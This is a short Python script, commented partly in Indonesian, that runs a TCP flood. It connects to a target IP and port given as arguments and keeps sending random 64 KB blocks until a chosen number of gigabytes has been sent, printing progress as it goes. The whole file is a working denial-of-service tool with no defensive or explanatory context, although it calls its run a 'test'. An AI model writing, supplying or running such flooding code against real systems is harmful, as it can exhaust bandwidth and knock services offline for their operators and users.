#!/usr/bin/python3
import socket
import random
import sys
import time

if len(sys.argv) != 4:
    sys.exit("Usage: f.py <target_ip> <target_port> <total_data_in_gb>")

def TCPFlood():
    ip = sys.argv[1]
    port = int(sys.argv[2])
    total_data_gb = int(sys.argv[3])
    
    packet_size = 65536  # 64 KB per paket
    total_data = total_data_gb * 1024 * 1024 * 1024  # Convert ke bytes
    total_packets = total_data // packet_size
    
    print(f"Starting TCP flood to {ip}:{port} for {total_data_gb} GB...")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    bytes_data = random._urandom(packet_size)  # Data acak
    
    sent_packets = 0
    start_time = time.time()
    
    try:
        while sent_packets < total_packets:
            sock.send(bytes_data)
            sent_packets += 1
            
            if sent_packets % 100000 == 0:
                elapsed_time = time.time() - start_time
                sent_data_gb = (sent_packets * packet_size) / (1024 ** 3)
                print(f"Sent: {sent_packets}/{total_packets} packets ({sent_data_gb:.2f} GB) in {elapsed_time:.2f} seconds")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        sock.close()
        print("Test completed.")

# Jalankan fungsi
TCPFlood()
